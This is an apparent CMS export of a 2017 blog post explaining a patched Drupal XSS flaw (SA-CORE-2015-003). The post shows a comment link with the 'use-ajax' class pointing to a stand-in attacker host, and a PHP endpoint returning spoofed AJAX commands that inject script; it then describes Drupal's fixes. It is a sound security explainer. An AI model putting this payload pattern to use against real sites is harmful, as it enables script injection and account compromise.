{
    "uuid": [
        {
            "value": "c14a8828-90f7-48e0-acd6-4b6fe8ce8383"
        }
    ],
    "langcode": [
        {
            "value": "en"
        }
    ],
    "type": [
        {
            "target_id": "blog",
            "target_type": "node_type",
            "target_uuid": "a90c00e7-fd49-42a6-8cdb-e99ec16f7742"
        }
    ],
    "revision_timestamp": [
        {
            "value": "2020-01-27T17:48:12+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "revision_uid": [
        {
            "target_type": "user",
            "target_uuid": "30bffdc0-96b3-4656-9078-3f8113359c60"
        }
    ],
    "revision_log": [],
    "status": [
        {
            "value": true
        }
    ],
    "uid": [
        {
            "target_type": "user",
            "target_uuid": "30bffdc0-96b3-4656-9078-3f8113359c60"
        }
    ],
    "title": [
        {
            "value": "Getting creative with Drupal XSS"
        }
    ],
    "created": [
        {
            "value": "2017-05-28T15:52:44+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "changed": [
        {
            "value": "2020-01-27T17:48:12+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "promote": [
        {
            "value": true
        }
    ],
    "sticky": [
        {
            "value": false
        }
    ],
    "default_langcode": [
        {
            "value": true
        }
    ],
    "revision_translation_affected": [
        {
            "value": true
        }
    ],
    "path": [
        {
            "alias": "",
            "pid": null,
            "langcode": "en"
        }
    ],
    "body": [
        {
            "value": "<p>In the world of web security, cross-site scripting (XSS) vulnerabilities are extremely common, and will continue to be a problem as web applications become increasingly complex. According to a 2016 report by Bugcrowd, a popular bug bounty site,&nbsp;<strong>\u201cXSS vulnerabilities account for 66% of valid submissions, followed by 20% categorized as CSRF\u201d<\/strong>&nbsp;(<a href=\"https:\/\/pages.bugcrowd.com\/hubfs\/PDFs\/state-of-bug-bounty-2016.pdf\">source<\/a>). That same report goes into some detail about the severity of XSS (page 23), which is worth reading to understand the scope of this kind of attack.<\/p>\r\n\r\n<p>Drupal developers are mostly protected from XSS by the HTML filtering system, but custom code can still allow attacks using unconventional exploits.<\/p>\r\n\r\n<p>For a simple web application, finding an XSS vulnerability may seem trivial. Looking at online resources, you often find code snippets like this:<\/p>\r\n\r\n<figure>\r\n<pre>\r\n<code data-lang=\"php\">&lt;h2&gt;Search results for \"&lt;?php echo $_GET['q']; ?&gt;\":&lt;\/h2&gt;<\/code><\/pre>\r\n<\/figure>\r\n\r\n<p>but now-a-days, finding an exploit this obvious is unlikely, unless you\u2019re looking at something completely hand-built. Drupal 8 makes code like this is even more unlikely, given that the templating system has moved to Twig, which escapes output by default and does not allow arbitrary PHP statements.<\/p>\r\n\r\n<p>So what kind of Drupal code can trigger XSS? Let\u2019s look at a practical example based on&nbsp;<a href=\"https:\/\/www.drupal.org\/SA-CORE-2015-003\">SA-CORE-2015-003<\/a>, which was a security release I helped out on.<\/p>\r\n\r\n<p><em>Note: The following exploit has already been fixed, don\u2019t freak out!<\/em><\/p>\r\n\r\n<p>Drupal has an internal AJAX system that responds to events on HTML elements, reaching out to a JSON endpoint to perform what\u2019s known as AJAX commands. An example of this is the autocomplete element, which triggers AJAX requests as a user types to determine autocomplete suggestions.<\/p>\r\n\r\n<p>You can enhance your HTML elements with this behavior like so:<\/p>\r\n\r\n<figure>\r\n<pre>\r\n<code data-lang=\"javascript\">Drupal.ajax({\r\n  url: '\/foo',\r\n  event: 'click',\r\n  element: $('#my-great-link'),\r\n});<\/code><\/pre>\r\n<\/figure>\r\n\r\n<p>but to make things easier for developers, Drupal will automatically bind AJAX behaviors to any element with the \u201cuse-ajax\u201d class. This may not seem like a big deal, but many Drupal sites allow users to input HTML, and classes are often allowed in default text filters.<\/p>\r\n\r\n<p>To re-cap, this is what we know at this point:<\/p>\r\n\r\n<ol>\r\n\t<li>Drupal allows users to enter HTML by default in areas like comments<\/li>\r\n\t<li>The XSS filtering in Drupal is really good, so assume we can\u2019t bypass it<\/li>\r\n\t<li>The class attribute is allowed in the default text filter<\/li>\r\n\t<li>The AJAX system automatically binds on elements with the \u201cuse-ajax\u201d class<\/li>\r\n<\/ol>\r\n\r\n<p>Knowing this, we can make a comment like this:<\/p>\r\n\r\n<figure>\r\n<pre>\r\n<code data-lang=\"html\">&lt;a href=\"http:\/\/mynastysite.com\/xss.php\" class=\"use-ajax\"&gt;Click me!&lt;\/a&gt;<\/code><\/pre>\r\n<\/figure>\r\n\r\n<p>and know that when the link is clicked, a POST request is made to an arbitrary URL, and Drupal will parse the response and process AJAX commands.<\/p>\r\n\r\n<p>The xss.php script on our endpoint could look something like this:<\/p>\r\n\r\n<figure>\r\n<pre>\r\n<code data-lang=\"php\">&lt;?php\r\n\r\n\/\/ Only display the spoof response if the method is POST, this way normal users\r\n\/\/ (i.e. non-admins) will see a normal page.\r\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\r\n  \/\/ Allow any site to make a POST request here.\r\n  header('Access-Control-Allow-Origin: *');\r\n  \/\/ Form a bare-bones JSON response for Drupal.\r\n  $foo = new stdClass();\r\n  $foo-&gt;command = 'insert';\r\n  $foo-&gt;data = '&lt;script&gt;alert(\"xss\")&lt;\/script&gt;';\r\n  $foo-&gt;method = 'append';\r\n  $foo-&gt;selector = 'body';\r\n  echo json_encode(array($foo));\r\n}\r\n\/\/ Display the normal page for GET requests.\r\nelse {\r\n  echo \"&lt;h1&gt;This is a normal site!&lt;\/h1&gt;\";\r\n}<\/code><\/pre>\r\n<\/figure>\r\n\r\n<p>Now when a user clicks our link, we can execute arbitrary Javascript in Drupal!<\/p>\r\n\r\n<p>The Drupal security team has since improved the AJAX system by adding two layers of defense:<\/p>\r\n\r\n<ol>\r\n\t<li>When an AJAX-enabled element triggers its event (i.e. is clicked), Drupal verifies that the URL is local before making the request (see&nbsp;<a href=\"http:\/\/cgit.drupalcode.org\/drupal\/tree\/core\/misc\/drupal.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n146\">Drupal.url.isLocal<\/a>).<\/li>\r\n\t<li>If a response does not contain a X-Drupal-Ajax-Token header, it is not processed. This prevents users from making local requests to uploaded files (see&nbsp;<a href=\"http:\/\/cgit.drupalcode.org\/drupal\/tree\/core\/misc\/ajax.js?id=d5d37e06490825d10c52545433773e22fe6b61fb#n220\">Drupal.Ajax.options.success<\/a>).<\/li>\r\n<\/ol>\r\n\r\n<p>This has been fixed for about two years, but it\u2019s a great example of how complex XSS vulnerabilities in Drupal can be.<\/p>\r\n\r\n<p>My biggest takeaway from this is that&nbsp;<em>you don\u2019t need to bypass the XSS filter to trigger XSS.<\/em>&nbsp;Get creative with your research, and don\u2019t hope to find quick-win exploits in code like:<\/p>\r\n\r\n<figure>\r\n<pre>\r\n<code data-lang=\"twig\">{{ twig_input | raw }}<\/code><\/pre>\r\n<\/figure>\r\n\r\n<p>because it\u2019s unlikely that you\u2019ll get that lucky. \ud83d\ude01<\/p>\r\n",
            "format": "full_html",
            "summary": ""
        }
    ],
    "field_tags": [
        {
            "target_type": "taxonomy_term",
            "target_uuid": "d9871794-7262-415a-a18e-fc784794b1c9"
        },
        {
            "target_type": "taxonomy_term",
            "target_uuid": "e30b1fff-0abe-4d0d-9ea9-6d81ed242109"
        }
    ]
}